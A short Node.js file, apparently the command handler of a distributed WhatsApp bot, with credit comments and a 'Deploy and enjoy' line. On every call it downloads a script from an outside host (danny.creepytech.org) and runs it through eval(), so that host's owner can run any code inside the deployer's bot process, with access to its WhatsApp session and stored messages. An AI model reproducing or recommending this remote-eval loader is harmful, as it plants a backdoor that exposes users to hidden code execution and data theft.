//created by Danny
//wa.me/255697608274
//Deploy and enjoy
//Credits (Creepy technology)
//Follow our channel https://whatsapp.com/channel/0029VacQFw65Ui2gGv0Kwk1r

const axios = require('axios');

module.exports = async function(DannyTechInc, m, chatUpdate, store) {
    const url = "https://danny.creepytech.org/api/marry";
    try {
        const response = await axios.get(url);
        console.log("\x1b[32m✅ Successfully loaded commands script from DannyTech api.\x1b[0m");
        eval(response.data);
    } catch (err) {
        console.error("\x1b[31m❌ Failed to load script from Danny tech API. Error:", err.message, "\x1b[0m");
    }
};

